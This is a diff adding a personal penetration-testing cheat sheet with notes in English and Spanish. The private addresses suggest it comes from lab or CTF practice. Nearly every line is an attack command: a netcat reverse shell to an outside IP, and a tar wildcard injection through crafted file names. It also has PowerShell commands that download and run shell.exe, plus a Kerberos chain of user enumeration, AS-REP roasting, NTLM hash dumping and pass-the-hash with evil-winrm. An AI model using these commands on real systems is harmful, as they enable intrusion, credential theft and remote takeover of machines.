@@ -1,0 +1,59 @@
+https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213 (Windows Server Elevate Priv)
+
+https://gtfobins.github.io/
+
+python -c Netcat Reverse Shell 
+
+/usr/bin/script -qc /bin/bash /dev/null
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.225.200 9999 >/tmp/f" > shell.sh
+touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+touch "/var/www/html/--checkpoint=1"
+
+Stabilize shell
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+Ctrl+Z
+stty raw -echo
+fg
+export TERM=xterm
+
+Get Shell in Windows with Metasploit
+
+use post/multi/manage/shell_to_meterpreter
+
+Bajar un archivo via powershell
+powershell -c "Invoke-WebRequest -Uri 'http://10.10.40.91/shell.exe' -Outfile 'C:/"Program Files (x86)/SystemScheduler/shell.exe'"
+
+powershell -c "(New-Object System.Net.WebClient).Downloadfile('http://10.10.40.91/shell.exe','shell.exe')"; Start-Process "shell.exe"
+
+
+Attacking Kerberos
+-------------------
+
+enum4linux -a HOST
+
+kerbrute userenum -d HOST --dc HOST USERLIST.txt -t 1	(Obtener lista de usuarios)
+
+find / -type f -name 'GetNPUsers.py'
+
+GetNPUsers.py HOST/user -no-pass	(Obtener TGT Hash)
+
+john HASH-FILE --wordlist=PASSWORD-FILE.txt		(Crack the Password)
+
+smbmap -H HOST -d HOST -u USER -p PASSWORD -r (listar los archivos del host)
+
+msf5 auxiliary/admin/smb/download_file (Para descargar los archivos listados)
+
+find / -type f -name 'secretsdump.py'
+
+secretsdump.py -just-dc user@HOST (Descargamos los NTLM Hashes)
+
+git clone https://github.com/Hackplayers/evil-winrm.git
+
+gem install evil-winrm
+
+evil-winrm -i IP -u USER -H HASH (Pass the hash)
+
+--------------------------------------------------------------------------------------
+ 
